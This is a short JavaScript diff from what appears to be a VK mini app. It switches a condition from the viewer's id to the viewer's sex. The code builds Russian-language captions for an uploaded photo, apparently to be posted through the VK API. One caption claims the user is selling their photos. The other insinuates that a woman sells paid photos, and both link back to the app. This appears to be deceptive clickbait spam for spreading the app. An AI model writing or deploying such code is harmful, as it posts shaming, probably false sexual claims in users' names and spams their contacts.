@@ -220,7 +220,7 @@
                                   setTimeout(function() {
                                     var id_photo = data.response[0].id;
                                     caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+"";
-                                    if(viewer.id == 2){
+                                    if(viewer.sex == 2){
                                       caption = "Смотрите чъи платные фотки нашёл, кто знал что она таким занимается? : \n\n https://vk.com/app"+vk_app_id+"#11";
                                     }
                                     vkConnect.sendPromise("VKWebAppCallAPIMethod", {
